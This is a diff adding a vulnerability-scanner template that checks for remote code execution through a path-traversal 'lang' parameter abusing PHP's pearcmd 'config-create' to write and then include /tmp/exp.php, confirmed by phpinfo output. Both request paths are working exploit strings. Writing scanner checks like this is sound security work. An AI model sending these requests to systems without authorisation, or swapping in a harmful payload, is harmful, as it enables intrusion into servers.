@@ -1,0 +1,38 @@
+id: custom-arbitrary-file-creation-check
+info:
+  author: chiragartani
+  description: Checks for arbitrary file creation via manipulated 'lang' parameter
+    leading to remote code execution.
+  name: Check Arbitrary File Creation Vulnerability
+  reference:
+  - https://3rag.com
+  severity: high
+  tags: rce,filecreate
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/%3C?phpinfo();%3E+/tmp/exp.php'
+  - '{{BaseURL}}/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/%3C?phpinfo();%3E+/tmp/exp.php'
+- extractors:
+  - part: body
+    regex:
+    - (?m)^.*$
+    type: regex
+  matchers:
+  - part: body
+    type: word
+    words:
+    - phpinfo
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/public/index.php?lang=../../../../../../../../tmp/exp'
+  - '{{BaseURL}}/index.php?lang=../../../../../../../../tmp/exp'
